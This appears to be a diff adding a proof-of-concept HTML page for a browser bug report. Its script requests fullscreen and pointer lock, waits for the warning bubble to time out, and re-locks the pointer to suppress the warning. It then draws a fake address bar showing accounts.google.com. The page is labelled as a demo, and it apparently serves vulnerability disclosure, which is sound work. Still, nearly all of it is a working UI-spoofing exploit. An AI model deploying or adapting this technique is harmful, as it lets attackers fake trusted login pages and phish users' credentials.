@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC - fullscreen warning suppression</title>
+<style>
+  html, body { margin:0; padding:0; background:#222; color:#0f0; font-family: monospace; }
+  #log { white-space: pre-wrap; padding: 16px; font-size: 14px; }
+  #fakebar {
+    position: fixed; top:0; left:0; right:0; height:40px;
+    background:#fff; color:#000; display:none;
+    align-items:center; padding:0 12px; font-family: Arial, sans-serif;
+    font-size: 14px; box-shadow: 0 1px 3px rgba(0,0,0,.3); z-index: 999999;
+  }
+  #fakebar.show { display:flex; }
+  #startBtn { font-size: 20px; padding: 12px 24px; margin: 20px; }
+</style>
+</head>
+<body>
+<button id="startBtn">Start demo (click once)</button>
+<div id="log"></div>
+
+<div id="fakebar">
+  &#128274;&nbsp;<b>accounts.google.com</b>&nbsp;&nbsp;|&nbsp;&nbsp;
+  <span style="color:#777">this bar is just a &lt;div&gt; drawn by the page - NOT real browser UI</span>
+</div>
+
+<script>
+const logEl = document.getElementById('log');
+function log(msg) {
+  const t = new Date().toISOString().split('T')[1].replace('Z','');
+  logEl.textContent += `[${t}] ${msg}\n`;
+  console.log(msg);
+}
+function stateSnapshot() {
+  return `fullscreenElement=${!!document.fullscreenElement} pointerLockElement=${!!document.pointerLockElement}`;
+}
+document.addEventListener('pointerlockchange', () => log('pointerlockchange -> ' + stateSnapshot()));
+document.addEventListener('fullscreenchange', () => log('fullscreenchange -> ' + stateSnapshot()));
+document.addEventListener('pointerlockerror', () => log('pointerlockerror!'));
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function run() {
+  log('Step 1: requesting fullscreen + pointer lock (user gesture)');
+  await document.documentElement.requestFullscreen();
+  await document.body.requestPointerLock();
+  log('Waiting 4.5s for the 3.8s auto-hide timer...');
+  await sleep(4500);
+
+  log('Step 2: bubble should have timed out -> silent-lock permission granted internally.');
+  log('Step 3: self-unlocking pointer...');
+  document.exitPointerLock();
+  await sleep(300);
+  log('-> ' + stateSnapshot());
+
+  log('Step 4: re-locking pointer (should go silent, no bubble reshow)...');
+  await document.body.requestPointerLock();
+  await sleep(300);
+  log('-> ' + stateSnapshot());
+  log('If the bug is real: NO bubble/toast should be visible right now, even though');
+  log('we are still in full screen with the real address bar hidden.');
+
+  log('Step 5: drawing fake address bar on top.');
+  document.getElementById('fakebar').classList.add('show');
+}
+
+document.getElementById('startBtn').addEventListener('click', () => {
+  document.getElementById('startBtn').style.display = 'none';
+  run();
+}, { once: true });
+</script>
+</body>
+</html>
